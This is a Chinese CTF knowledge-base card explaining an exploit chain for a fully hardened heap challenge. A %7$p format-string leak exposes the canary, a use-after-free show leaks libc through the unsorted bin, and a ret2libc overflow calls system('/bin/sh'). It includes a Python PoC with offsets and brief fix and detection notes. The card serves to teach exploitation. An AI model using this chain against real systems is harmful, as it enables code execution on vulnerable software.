---
id: ctf-pwn-format-canary-uaf-unsorted-ret2libc-all-protections
title: 全保护堆题组合链：%7$p 泄 canary + UAF show 泄 unsorted bin + 栈溢出 ret2libc
type: scenario
domain: ctf
path: ctf/pwn
technique: format-canary-uaf-unsorted-ret2libc
tags:
- ctf
- pwn
- format-string
- canary
- uaf
- unsorted-bin
- ret2libc
- pie
- full-relro
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:22:20+08:00'
  notes: 已对照原文与结果核对：fgets(name,6)/printf(name) 用 %7$p 泄 canary、forge 0x84(0x90)、free 前 7 填 tcache 再 free slot7 进 unsorted、show 的 %s 泄 fd、libc_base+0x1ecbe0、use_slingring spell[0x40]/fgets 0x100 偏移 0x38、ret/pop rdi/binsh/system 链、实测 ISCC{ff9e0a07-...} 均与卡片一致。原 affected_versions=glibc 2.31 为题目 libc 环境版本，按 brief 已 --clear。未验证点：PoC 未本机复跑；frontmatter 无 sources/source_url。
url: /docs/ctf/pwn/ctf-pwn-format-canary-uaf-unsorted-ret2libc-all-protections/
draft: false
kb_aliases:
- Ring factory
- '%7$p canary'
- UAF show 泄露
- unsorted bin fd
- 全保护 ret2libc
- use_slingring 栈溢出
---

## 一句话结论

程序 PIE、Full RELRO、Canary、NX 全开；启动时 `printf(name)` 且只允许 5 字节，用 `%7$p` 泄露 canary；`discard_slingring` 只 `free` 不清指针造成 UAF，`show_slingrings` 的 `%s` 从 unsorted bin 的 fd 泄露 libc；`use_slingring` 的 `fgets(spell, 0x100)` 溢出，回填 canary 后构造 `pop rdi; ret` + `/bin/sh` + `system` 的 ret2libc。

## 原理

- **短格式串泄 canary**：`fgets(name, 6, stdin)` 最多 5 个可控字符，足够输入 `%7$p`；`printf(name)` 把第 7 个可变参数槽（栈上 canary）以十六进制打印。Canary 低字节为 `0x00`，泄露值通常以 `00` 结尾。
- **UAF 泄 libc**：`forge_slingring` 每次分配 0x84 字节（chunk size 0x90）；`discard_slingring` 只 `free(rings[idx])` 不清空全局数组；`show_slingrings` 继续用 dangling 指针 `printf("%s", rings[i]->dest)`。先申请 9 个 chunk，释放前 7 个填满 tcache，再释放第 7 个使其进入 unsorted bin，其 fd 指向 `main_arena`；glibc 2.31 下该 fd 偏移为 `libc_base + 0x1ecbe0`。
- **栈溢出**：`use_slingring` 中 `char spell[0x40]; fgets(spell, 0x100, stdin)`，到 canary 的偏移为 0x38，之后是 saved rbp 与返回地址。
- **Full RELRO 限制**：不能改 GOT，只能 ROP；PIE 下 gadget 与 `"/bin/sh"` 都从 libc 取，需先泄 libc 基址。

## 触发条件

- 存在 `printf(user_input)` 且输入长度足够表达 `%N$p`。
- 堆管理存在 free 后不清指针的 UAF，且 show 能打印 dangling chunk 内容。
- 存在带 canary 的栈溢出；libc 版本已知（本例 glibc 2.31）。
- PIE/Full RELRO/Canary/NX 全开，排除改 GOT 的捷径。

## 利用步骤

1. 启动时发送 `%7$p`，从 `Hello, ` 后解析 canary；若槽位不对，扫描 `%1$p`–`%30$p` 找低字节为 `00` 且每次运行变化的值。
2. 申请 9 个 0x90 chunk；释放前 7 个填满 tcache；再释放第 7 个（或第 8 个）使其进入 unsorted bin。
3. 调用 show，定位 `Ring Slot #7` 行，取 `]   | ` 后的 6 字节作为 unsorted fd，补零成 64 位，减去 `0x1ecbe0` 得 libc 基址。
4. 计算 `ret`、`pop rdi; ret`、`system`、`"/bin/sh"` 地址（均来自题目 libc）。
5. 进入 `use_slingring`，发送 `padding(0x38) + canary + 8 字节 + ret + pop_rdi + binsh + system`；`ret` 用于满足 `system` 入口 `RSP % 16 == 8` 的对齐。
6. 获取 shell 后发送 `cat flag; cat /flag; cat /flag*` 等命令。

## PoC

```python
canary = int(recvline_after(b"Hello, ").strip(), 16)
for i in range(9):
    forge(i, bytes([0x41 + i]), 1)
for i in range(7):
    discard(i)
discard(7)
data = show()
line = data[data.find(b"Ring Slot #7  | ["):]
fd = u64(line.split(b"]   | ", 1)[1][:6].ljust(8, b"\x00"))
libc_base = fd - 0x1ECBE0
payload = flat(b"A" * 0x38, p64(canary), b"B" * 8,
               p64(libc_base + RET), p64(libc_base + POP_RDI),
               p64(libc_base + BIN_SH), p64(libc_base + libc.sym["system"]))
```

## 变体与关联

- **泄露变体**：canary 槽位随栈帧变化；unsorted bin fd 偏移随 libc 版本变化；也可用 `%s` 读 GOT 或栈上的 libc 返回地址。
- **利用变体**：无 `pop rdi` 时用 ret2csu/one_gadget；有 `__free_hook` 且能写时可直接改 hook；tcache 数量/版本不同需调整填充个数。
- **关联卡片**：[[binary-pwn-format-string-canary-libc-leak-rop-system]]（格式串泄 canary+libc）、[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（UAF unsorted bin 泄露）、[[binary-pwn-stack-ret2libc]]（通用 ret2libc）。
- **边界**：若 show 对指针做了校验或 free 后置空，UAF 不成立；若 canary 每次请求重随机，必须同连接内泄露并回填。

## 检测与防御

- **CTF 验证**：先确认 canary 低字节为 `00` 且可回填不触发 `__stack_chk_fail`；再确认 fd 减去偏移后页对齐；最后确认 ROP 链能执行 `system`。
- **修复**：`printf("%s", name)`；free 后立即置空全局指针；`fgets` 长度与缓冲区一致；保持 Full RELRO/PIE/Canary/NX。
- **检测信号**：启动输入出现 `%N$p`；堆 show 输出未初始化/已释放 chunk；栈溢出 payload 中出现 canary 原值与 libc gadget 序列。
